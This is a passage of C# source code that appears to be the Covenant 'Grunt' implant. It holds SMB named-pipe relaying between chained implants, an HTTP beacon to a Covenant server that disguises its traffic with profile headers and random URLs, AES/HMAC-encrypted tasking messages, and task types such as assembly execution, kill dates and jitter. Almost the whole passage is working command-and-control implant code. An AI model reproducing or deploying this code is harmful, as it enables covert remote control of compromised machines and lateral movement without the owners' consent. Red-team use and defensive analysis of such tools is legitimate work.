            lock (_MessageQueueLock)
            {
                this.MessageQueue.Enqueue(uploaded);
            }
        }

        public void WriteTaskingMessage()
        {
            try
            {
                lock (_UpstreamLock)
                {
                    lock (_MessageQueueLock)
                    {
                        this.UpstreamMessenger.Write(this.MessageQueue.Dequeue());
                    }
                }
            }
            catch (InvalidOperationException) {}
        }

        public void SetAuthenticator(string Authenticator)
        {
            lock (this._UpstreamLock)
            {
                this.UpstreamMessenger.Authenticator = Authenticator;
            }
        }

        public bool Connect(string Hostname, string PipeName)
        {
            IMessenger olddownstream = this.DownstreamMessengers.FirstOrDefault(DM => DM.Hostname.ToLower() == (Hostname + ":" + PipeName).ToLower());
            if (olddownstream != null)
            {
                olddownstream.Close();
                this.DownstreamMessengers.Remove(olddownstream);
            }

            SMBMessenger downstream = new SMBMessenger(Hostname, PipeName);
            Thread readThread = new Thread(() =>
            {
                while (downstream.IsConnected)
                {
                    try
                    {
                        ProfileMessage read = downstream.Read();
                        if (read != null && !string.IsNullOrEmpty(read.Message))
                        {
                            if (string.IsNullOrEmpty(downstream.Identifier))
                            {
                                GruntEncryptedMessage message = this.Profile.ParsePostRequest(read.Message);
                                if (message.GUID.Length == 20)
                                {
                                    downstream.Identifier = message.GUID.Substring(10);
                                }
                                else if (message.GUID.Length == 10)
                                {
                                    downstream.Identifier = message.GUID;
                                }
                            }
                            this.UpstreamMessenger.Write(read.Message);
                        }
                    }
                    catch (Exception e)
                    {
                        Console.Error.WriteLine("Thread Exception: " + e.Message + Environment.NewLine + e.StackTrace);
                    }
                }
                // Connection became disconnected and therefore we remove the downstream object
                this.DownstreamMessengers.Remove(downstream);
            });
            downstream.ReadThread = readThread;
            downstream.ReadThread.Start();
            this.DownstreamMessengers.Add(downstream);
            return true;
        }

        public bool Disconnect(string Identifier)
        {
            IMessenger downstream = this.DownstreamMessengers.FirstOrDefault(DM => DM.Identifier.ToLower() == Identifier.ToLower());
            if (downstream != null)
            {
                downstream.Close();
                this.DownstreamMessengers.Remove(downstream);
                return true;
            }
            return false;
        }
    }

    public class SMBMessenger : IMessenger
    {
        public string Hostname { get; } = string.Empty;
        public string Identifier { get; set; } = string.Empty;
        public string Authenticator { get; set; } = string.Empty;
        public EventHandler<MessageEventArgs> UpstreamEventHandler { get; set; }
        public Thread ReadThread { get; set; } = null;

        private string PipeName { get; } = null;
        // Thread that monitors the status of the named pipe and updates _IsConnected accordingly.
        private Thread MonitoringThread { get; set; } = null;
        // This flag syncs communication peers in case one of the them dies (see method Read and Write)
        private bool IsServer { get; set; }
        private int Timeout { get; set; } = 5000;

        private object _PipeLock = new object();
        private PipeStream _Pipe;
        private PipeStream Pipe
        {
            get { lock (this._PipeLock) { return this._Pipe; } }
            set { lock (this._PipeLock) { this._Pipe = value; } }
        }

        protected object _IsConnectedLock = new object();
        private bool _IsConnected;
        public bool IsConnected
        {
            get { lock (this._IsConnectedLock) { return this._IsConnected; } }
            set { lock (this._IsConnectedLock) { this._IsConnected = value; } }
        }

        public SMBMessenger(string Hostname, string Pipename)
        {
            this.Hostname = Hostname;
            this.PipeName = Pipename;
            this.IsServer = false;
            this.InitializePipe();
        }

        public SMBMessenger(PipeStream Pipe, string Pipename)
        {
            this.Pipe = Pipe;
            this.PipeName = Pipename;
            this.IsServer = true;
            if (Pipe != null && Pipe.IsConnected)
            {
                this.IsConnected = Pipe.IsConnected;
                this.MonitorPipeState();
            }
            this.InitializePipe();
        }

        public ProfileMessage Read()
        {
            ProfileMessage result = null;
            try
            {
                // If the Grunt acts as SMB server, then after an interruption it shall wait in the read method until the connection 
                // is re-established.
                // This ensures that after the interruption, both communication peers return to their pre-defined state. If this is not
                // implemented, then both communication peers might return to the same state (e.g., read), which leads to a deadlock.
                if (this.IsServer)
                {
                    this.InitializePipe();
                }
                if (this.IsConnected)
                {
                    result = new ProfileMessage { Type = MessageType.Read, Message = Common.GruntEncoding.GetString(this.ReadBytes()) };
                }
            }
            // These are exceptions that could be raised, if the named pipe became (unexpectedly) closed. It is important to catch these 
            // exceptions here so that the calling method can continue until it calls Read or Write the next time and then, the they'll 
            // try to restablish the named pipe
            catch (IOException) { }
            catch (NullReferenceException) { }
            catch (ObjectDisposedException) { }
            return result;
        }

        public void Write(string Message)
        {
            try
            {
                // If the Grunt acts as SMB client, then after an interruption it shall wait in the write method until the connection 
                // is re-established.
                // This ensures that after the interruption, both communication peers return to their pre-defined state. If this is not
                // implemented, then both communication peers might return to the same state (e.g., read), which leads to a deadlock.
                if (!this.IsServer)
                {
                    this.InitializePipe();
                }
                if (this.IsConnected)
                {
                    this.WriteBytes(Common.GruntEncoding.GetBytes(Message));
                }
            }
            // These are exceptions that could be raised, if the named pipe became (unexpectedly) closed. It is important to catch these 
            // exceptions here so that the calling method can continue until it calls Read or Write the next time and then, the they'll 
            // try to restablish the named pipe
            catch (IOException) { }
            catch (NullReferenceException) { }
            catch (ObjectDisposedException) { }
        }

        public void Close()
        {
            // Close named pipe and terminate MonitoringThread by setting IsConnected to false
            lock (this._PipeLock)
            {
                try
                {
                    if (this._Pipe != null)
                    {
                        this._Pipe.Close();
                    }
                }
                catch (Exception) { }
                this._Pipe = null;
                this.IsConnected = false;
            }
        }

        private void InitializePipe()
        {
            if (!this.IsConnected)
            {
                // If named pipe became disconnected (!this.IsConnected), then wait for a new incoming connection, else continue.
                if (this.IsServer)
                {
                    PipeSecurity ps = new PipeSecurity();
                    ps.AddAccessRule(new PipeAccessRule(new SecurityIdentifier(WellKnownSidType.WorldSid, null), PipeAccessRights.FullControl, AccessControlType.Allow));
                    NamedPipeServerStream newServerPipe = new NamedPipeServerStream(this.PipeName, PipeDirection.InOut, NamedPipeServerStream.MaxAllowedServerInstances, PipeTransmissionMode.Byte, PipeOptions.Asynchronous, 1024, 1024, ps);
                    newServerPipe.WaitForConnection();
                    this.Pipe = newServerPipe;
                    this.IsConnected = true;
                    this.MonitorPipeState();
                    // Tell the parent Grunt the GUID so that it knows to which child grunt which messages shall be forwarded. Without this message, any further communication breaks.
                    this.UpstreamEventHandler?.Invoke(this, new MessageEventArgs { Message = string.Empty });
                }
                // If named pipe became disconnected (!this.IsConnected), then try to re-connect to the SMB server, else continue.
                else
                {
                    NamedPipeClientStream ClientPipe = new NamedPipeClientStream(Hostname, PipeName, PipeDirection.InOut, PipeOptions.Asynchronous);
                    ClientPipe.Connect(Timeout);
                    ClientPipe.ReadMode = PipeTransmissionMode.Byte;
                    this.Pipe = ClientPipe;
                    this.IsConnected = true;
                    // Start the pipe status monitoring thread
                    this.MonitorPipeState();
                }
            }
        }

        private void MonitorPipeState()
        {
            this.MonitoringThread = new Thread(() =>
            {
                while (this.IsConnected)
                {
                    try
                    {

                        Thread.Sleep(1000);
                        // We cannot use this.Pipe.IsConnected because this will result in a deadlock
                        this.IsConnected = this._Pipe.IsConnected;
                        if (!this.IsConnected)
                        {
                            this._Pipe.Close();
                            this._Pipe = null;
                        }
                    }
                    catch (Exception) { }
                }
            });
            this.MonitoringThread.IsBackground = true;
            this.MonitoringThread.Start();
        }

        private void WriteBytes(byte[] bytes)
        {
            byte[] compressed = Utilities.Compress(bytes);
            byte[] size = new byte[4];
            size[0] = (byte)(compressed.Length >> 24);
            size[1] = (byte)(compressed.Length >> 16);
            size[2] = (byte)(compressed.Length >> 8);
            size[3] = (byte)compressed.Length;
            this.Pipe.Write(size, 0, size.Length);
            var writtenBytes = 0;
            while (writtenBytes < compressed.Length)
            {
                int bytesToWrite = Math.Min(compressed.Length - writtenBytes, 1024);
                this.Pipe.Write(compressed, writtenBytes, bytesToWrite);
                writtenBytes += bytesToWrite;
            }
        }

        private byte[] ReadBytes()
        {
            byte[] size = new byte[4];
            int totalReadBytes = 0;
            do
            {
                totalReadBytes += this.Pipe.Read(size, 0, size.Length);
            } while (totalReadBytes < size.Length);
            int len = (size[0] << 24) + (size[1] << 16) + (size[2] << 8) + size[3];

            byte[] buffer = new byte[1024];
            using (var ms = new MemoryStream())
            {
                totalReadBytes = 0;
                int readBytes = 0;
                do
                {
                    readBytes = this.Pipe.Read(buffer, 0, buffer.Length);
                    ms.Write(buffer, 0, readBytes);
                    totalReadBytes += readBytes;
                } while (totalReadBytes < len);
                return Utilities.Decompress(ms.ToArray());
            }
        }
    }

    public class HttpMessenger : IMessenger
    {
        public string Hostname { get; } = "";
        public string Identifier { get; set; } = "";
        public string Authenticator { get; set; } = "";
        public EventHandler<MessageEventArgs> UpstreamEventHandler { get; set; }

        private string CovenantURI { get; }
        private CookieWebClient CovenantClient { get; set; } = new CookieWebClient();
        private object _WebClientLock = new object();

        private Random Random { get; set; } = new Random();
        private List<string> ProfileHttpHeaderNames { get; }
        private List<string> ProfileHttpHeaderValues { get; }
        private List<string> ProfileHttpUrls { get; }

        private bool UseCertPinning { get; set; }
        private bool ValidateCert { get; set; }

        private Queue<ProfileMessage> ToReadQueue { get; } = new Queue<ProfileMessage>();

        public HttpMessenger(string CovenantURI, string CovenantCertHash, bool UseCertPinning, bool ValidateCert, List<string> ProfileHttpHeaderNames, List<string> ProfileHttpHeaderValues, List<string> ProfileHttpUrls)
        {
            this.CovenantURI = CovenantURI;
            this.Hostname = CovenantURI.Split(':')[1].Split('/')[2];
            this.ProfileHttpHeaderNames = ProfileHttpHeaderNames;
            this.ProfileHttpHeaderValues = ProfileHttpHeaderValues;
            this.ProfileHttpUrls = ProfileHttpUrls;

            this.CovenantClient.UseDefaultCredentials = true;
            this.CovenantClient.Proxy = WebRequest.DefaultWebProxy;
            this.CovenantClient.Proxy.Credentials = CredentialCache.DefaultNetworkCredentials;

            this.UseCertPinning = UseCertPinning;
            this.ValidateCert = ValidateCert;

            ServicePointManager.SecurityProtocol = SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls;
            ServicePointManager.ServerCertificateValidationCallback = (sender, cert, chain, errors) =>
            {
                bool valid = true;
                if (this.UseCertPinning && CovenantCertHash != "")
                {
                    valid = cert.GetCertHashString() == CovenantCertHash;
                }
                if (valid && this.ValidateCert)
                {
                    valid = errors == System.Net.Security.SslPolicyErrors.None;
                }
                return valid;
            };
        }

        public ProfileMessage Read()
        {
            if (this.ToReadQueue.Any())
            {
                return this.ToReadQueue.Dequeue();
            }
            lock (this._WebClientLock)
            {
                this.SetupCookieWebClient();
                return new ProfileMessage { Type = MessageType.Read, Message = this.CovenantClient.DownloadString(this.CovenantURI + this.GetURL()) };
            }
        }

        public void Write(string Message)
        {
            lock (this._WebClientLock)
            {
                this.SetupCookieWebClient();
                ProfileMessage ToReadMessage = new ProfileMessage { Type = MessageType.Write, Message = this.CovenantClient.UploadString(this.CovenantURI + this.GetURL(), Message) };
                if (ToReadMessage.Message != "")
                {
                    this.ToReadQueue.Enqueue(ToReadMessage);
                }
            }
        }

        public void Close() { }

        private string GetURL()
        {
            return this.ProfileHttpUrls[this.Random.Next(this.ProfileHttpUrls.Count)].Replace("{GUID}", this.Identifier);
        }

        private void SetupCookieWebClient()
        {
            for (int i = 0; i < ProfileHttpHeaderValues.Count; i++)
            {
                if (ProfileHttpHeaderNames[i] == "Cookie")
                {
                    this.CovenantClient.SetCookies(new Uri(this.CovenantURI), ProfileHttpHeaderValues[i].Replace(";", ",").Replace("{GUID}", this.Identifier));
                }
                else
                {
                    this.CovenantClient.Headers.Set(ProfileHttpHeaderNames[i].Replace("{GUID}", this.Identifier), ProfileHttpHeaderValues[i].Replace("{GUID}", this.Identifier));
                }
            }
        }
    }

    public class MessageCrafter
    {
        private string GUID { get; }
        private Aes SessionKey { get; }

        public MessageCrafter(string GUID, Aes SessionKey)
        {
            this.GUID = GUID;
            this.SessionKey = SessionKey;
        }

        public GruntEncryptedMessage Create(string Message, string Meta = "")
        {
            return this.Create(Common.GruntEncoding.GetBytes(Message), Meta);
        }

        public GruntEncryptedMessage Create(byte[] Message, string Meta = "")
        {
            byte[] encryptedMessagePacket = Utilities.AesEncrypt(Message, this.SessionKey.Key);
            byte[] encryptionIV = new byte[Common.AesIVLength];
            Buffer.BlockCopy(encryptedMessagePacket, 0, encryptionIV, 0, Common.AesIVLength);
            byte[] encryptedMessage = new byte[encryptedMessagePacket.Length - Common.AesIVLength];
            Buffer.BlockCopy(encryptedMessagePacket, Common.AesIVLength, encryptedMessage, 0, encryptedMessagePacket.Length - Common.AesIVLength);

            byte[] hmac = Utilities.ComputeHMAC(encryptedMessage, SessionKey.Key);
            return new GruntEncryptedMessage
            {
                GUID = this.GUID,
                Meta = Meta,
                EncryptedMessage = Convert.ToBase64String(encryptedMessage),
                IV = Convert.ToBase64String(encryptionIV),
                HMAC = Convert.ToBase64String(hmac)
            };
        }

        public string Retrieve(GruntEncryptedMessage message)
        {
            if (message == null || !message.VerifyHMAC(this.SessionKey.Key))
            {
                return null;
            }
            return Common.GruntEncoding.GetString(Utilities.AesDecrypt(message, SessionKey.Key));
        }
    }

    public class CookieWebClient : WebClient
    {
        private CookieContainer CookieContainer { get; }
        public CookieWebClient()
        {
            this.CookieContainer = new CookieContainer();
        }
        public void SetCookies(Uri uri, string cookies)
        {
            this.CookieContainer.SetCookies(uri, cookies);
        }
        protected override WebRequest GetWebRequest(Uri address)
        {
            var request = base.GetWebRequest(address) as HttpWebRequest;
            if (request == null) return base.GetWebRequest(address);
            request.CookieContainer = CookieContainer;
            return request;
        }
    }

    public enum GruntTaskingType
    {
        Assembly,
        SetDelay,
        SetJitter,
        SetConnectAttempts,
        SetKillDate,
        Exit,
        Connect,
        Disconnect,
        Tasks,
        TaskKill
    }

    public class GruntTaskingMessage
    {
        public GruntTaskingType Type { get; set; }
        public string Name { get; set; }
        public string Message { get; set; }
        public bool Token { get; set; }

        private static string GruntTaskingMessageFormat = @"{{""type"":""{0}"",""name"":""{1}"",""message"":""{2}"",""token"":{3}}}";
        public static GruntTaskingMessage FromJson(string message)
        {
            List<string> parseList = Utilities.Parse(message, GruntTaskingMessageFormat);
            if (parseList.Count < 3) { return null; }
            return new GruntTaskingMessage
            {
				Type = (GruntTaskingType)Enum.Parse(typeof(GruntTaskingType), parseList[0], true),
                Name = parseList[1],
                Message = parseList[2],
                Token = Convert.ToBoolean(parseList[3])
            };
        }

        public static string ToJson(GruntTaskingMessage message)
        {
            return String.Format(
                GruntTaskingMessageFormat,
                message.Type.ToString("D"),
                Utilities.JavaScriptStringEncode(message.Name),
                Utilities.JavaScriptStringEncode(message.Message),
                message.Token
            );
        }
    }

    public enum GruntTaskingStatus
    {
        Uninitialized,
        Tasked,
        Progressed,
        Completed,
        Aborted
    }

    public class GruntTaskingMessageResponse
    {
        public GruntTaskingMessageResponse(GruntTaskingStatus status, string output)
        {
            Status = status;
            Output = output;
        }
        public GruntTaskingStatus Status { get; set; }
        public string Output { get; set; }

        private static string GruntTaskingMessageResponseFormat = @"{{""status"":""{0}"",""output"":""{1}""}}";
        public string ToJson()
        {
            return String.Format(
                GruntTaskingMessageResponseFormat,
                this.Status.ToString("D"),
                Utilities.JavaScriptStringEncode(this.Output)
            );
        }
    }

    public class GruntEncryptedMessage
    {
        public enum GruntEncryptedMessageType
        {
            Routing,
            Tasking
        }

		public string GUID { get; set; } = "";
        public GruntEncryptedMessageType Type { get; set; }
        public string Meta { get; set; } = "";
		public string IV { get; set; } = "";
		public string EncryptedMessage { get; set; } = "";
		public string HMAC { get; set; } = "";

        public bool VerifyHMAC(byte[] Key)
        {
            if (EncryptedMessage == "" || HMAC == "" || Key.Length == 0) { return false; }
            try
            {
                var hashedBytes = Convert.FromBase64String(this.EncryptedMessage);
                return Utilities.VerifyHMAC(hashedBytes, Convert.FromBase64String(this.HMAC), Key);
            }
            catch
            {
                return false;
            }
        }

        private static string GruntEncryptedMessageFormat = @"{{""GUID"":""{0}"",""Type"":{1},""Meta"":""{2}"",""IV"":""{3}"",""EncryptedMessage"":""{4}"",""HMAC"":""{5}""}}";
        public static GruntEncryptedMessage FromJson(string message)
        {
			List<string> parseList = Utilities.Parse(message, GruntEncryptedMessageFormat);
            if (parseList.Count < 5) { return null; }
            return new GruntEncryptedMessage
            {
                GUID = parseList[0],
                Type = (GruntEncryptedMessageType)int.Parse(parseList[1]),
                Meta = parseList[2],
                IV = parseList[3],
                EncryptedMessage = parseList[4],
                HMAC = parseList[5]
            };
        }

        public static string ToJson(GruntEncryptedMessage message)
        {
            return String.Format(
                GruntEncryptedMessageFormat,
                Utilities.JavaScriptStringEncode(message.GUID),
                message.Type.ToString("D"),
                Utilities.JavaScriptStringEncode(message.Meta),
                Utilities.JavaScriptStringEncode(message.IV),
                Utilities.JavaScriptStringEncode(message.EncryptedMessage),
                Utilities.JavaScriptStringEncode(message.HMAC)
            );
        }
    }

    public static class Common
    {
        public static int AesIVLength = 16;
        public static CipherMode AesCipherMode = CipherMode.CBC;
        public static PaddingMode AesPaddingMode = PaddingMode.PKCS7;
        public static Encoding GruntEncoding = Encoding.UTF8;
    }

    public static class Utilities
    {
        // Returns IV (16 bytes) + EncryptedData byte array
        public static byte[] AesEncrypt(byte[] data, byte[] key)
        {
            Aes SessionKey = Aes.Create();
            SessionKey.Mode = Common.AesCipherMode;
            SessionKey.Padding = Common.AesPaddingMode;
            SessionKey.GenerateIV();
            SessionKey.Key = key;

            byte[] encrypted = SessionKey.CreateEncryptor().TransformFinalBlock(data, 0, data.Length);
            byte[] result = new byte[SessionKey.IV.Length + encrypted.Length];
            Buffer.BlockCopy(SessionKey.IV, 0, result, 0, SessionKey.IV.Length);
            Buffer.BlockCopy(encrypted, 0, result, SessionKey.IV.Length, encrypted.Length);
            return result;
        }

        // Data should be of format: IV (16 bytes) + EncryptedBytes
        public static byte[] AesDecrypt(byte[] data, byte[] key)
        {
            Aes SessionKey = Aes.Create();
            byte[] iv = new byte[Common.AesIVLength];
            Buffer.BlockCopy(data, 0, iv, 0, Common.AesIVLength);
            SessionKey.IV = iv;
            SessionKey.Key = key;
            byte[] encryptedData = new byte[data.Length - Common.AesIVLength];
            Buffer.BlockCopy(data, Common.AesIVLength, encryptedData, 0, data.Length - Common.AesIVLength);
            byte[] decrypted = SessionKey.CreateDecryptor().TransformFinalBlock(encryptedData, 0, encryptedData.Length);

            return decrypted;
        }

        // Convenience method for decrypting an EncryptedMessagePacket
        public static byte[] AesDecrypt(GruntEncryptedMessage encryptedMessage, byte[] key)
        {
            byte[] iv = Convert.FromBase64String(encryptedMessage.IV);
            byte[] encrypted = Convert.FromBase64String(encryptedMessage.EncryptedMessage);
            byte[] combined = new byte[iv.Length + encrypted.Length];
            Buffer.BlockCopy(iv, 0, combined, 0, iv.Length);
            Buffer.BlockCopy(encrypted, 0, combined, iv.Length, encrypted.Length);

            return AesDecrypt(combined, key);
        }

        public static byte[] ComputeHMAC(byte[] data, byte[] key)
        {
            HMACSHA256 SessionHmac = new HMACSHA256(key);
            return SessionHmac.ComputeHash(data);
        }

        public static bool VerifyHMAC(byte[] hashedBytes, byte[] hash, byte[] key)
        {
            HMACSHA256 hmac = new HMACSHA256(key);
            byte[] calculatedHash = hmac.ComputeHash(hashedBytes);
            // Should do double hmac?
            return Convert.ToBase64String(calculatedHash) == Convert.ToBase64String(hash);
        }

        public static byte[] Compress(byte[] bytes)
        {
            byte[] compressedBytes;
            using (MemoryStream memoryStream = new MemoryStream())
            {
                using (DeflateStream deflateStream = new DeflateStream(memoryStream, CompressionMode.Compress))
                {
                    deflateStream.Write(bytes, 0, bytes.Length);
                }
                compressedBytes = memoryStream.ToArray();
            }
            return compressedBytes;
        }

        public static byte[] Decompress(byte[] compressed)
        {
            using (MemoryStream inputStream = new MemoryStream(compressed.Length))
            {
                inputStream.Write(compressed, 0, compressed.Length);
                inputStream.Seek(0, SeekOrigin.Begin);
                using (MemoryStream outputStream = new MemoryStream())
                {
                    using (DeflateStream deflateStream = new DeflateStream(inputStream, CompressionMode.Decompress))
                    {
                        byte[] buffer = new byte[4096];
                        int bytesRead;
                        while ((bytesRead = deflateStream.Read(buffer, 0, buffer.Length)) != 0)
                        {
                            outputStream.Write(buffer, 0, bytesRead);
                        }
                    }
                    return outputStream.ToArray();
                }
            }
        }

        public static List<string> Parse(string data, string format)
        {
            format = Regex.Escape(format).Replace("\\{", "{").Replace("{{", "{").Replace("}}", "}");
			if (format.Contains("{0}")) { format = format.Replace("{0}", "(?'group0'.*)"); }
            if (format.Contains("{1}")) { format = format.Replace("{1}", "(?'group1'.*)"); }
            if (format.Contains("{2}")) { format = format.Replace("{2}", "(?'group2'.*)"); }
            if (format.Contains("{3}")) { format = format.Replace("{3}", "(?'group3'.*)"); }
            if (format.Contains("{4}")) { format = format.Replace("{4}", "(?'group4'.*)"); }
            if (format.Contains("{5}")) { format = format.Replace("{5}", "(?'group5'.*)"); }
            Match match = new Regex(format).Match(data);
            List<string> matches = new List<string>();
			if (match.Groups["group0"] != null) { matches.Add(match.Groups["group0"].Value); }
            if (match.Groups["group1"] != null) { matches.Add(match.Groups["group1"].Value); }
            if (match.Groups["group2"] != null) { matches.Add(match.Groups["group2"].Value); }
            if (match.Groups["group3"] != null) { matches.Add(match.Groups["group3"].Value); }
            if (match.Groups["group4"] != null) { matches.Add(match.Groups["group4"].Value); }
            if (match.Groups["group5"] != null) { matches.Add(match.Groups["group5"].Value); }
            return matches;
        }

        // Adapted from https://github.com/mono/mono/blob/master/mcs/class/System.Web/System.Web/HttpUtility.cs
        public static string JavaScriptStringEncode(string value)
        {
            if (String.IsNullOrEmpty(value)) { return String.Empty; }
            int len = value.Length;
            bool needEncode = false;
            char c;
            for (int i = 0; i < len; i++)
            {
                c = value[i];
                if (c >= 0 && c <= 31 || c == 34 || c == 39 || c == 60 || c == 62 || c == 92)
                {
                    needEncode = true;
                    break;
                }
            }
            if (!needEncode) { return value; }

            var sb = new StringBuilder();
            for (int i = 0; i < len; i++)
            {
                c = value[i];
                if (c >= 0 && c <= 7 || c == 11 || c >= 14 && c <= 31 || c == 39 || c == 60 || c == 62)
                {
                    sb.AppendFormat("\\u{0:x4}", (int)c);
                }
                else
                {
                    switch ((int)c)
                    {
                        case 8:
                            sb.Append("\\b");
                            break;
                        case 9:
                            sb.Append("\\t");
                            break;
                        case 10:
                            sb.Append("\\n");
                            break;
                        case 12:
                            sb.Append("\\f");
                            break;
                        case 13:
                            sb.Append("\\r");
                            break;
                        case 34:
                            sb.Append("\\\"");
                            break;
                        case 92:
                            sb.Append("\\\\");
                            break;
                        default:
                            sb.Append(c);
                            break;
                    }
                }
            }
            return sb.ToString();
        }

        // {{REPLACE_PROFILE_MESSAGE_TRANSFORM}}
    }
}
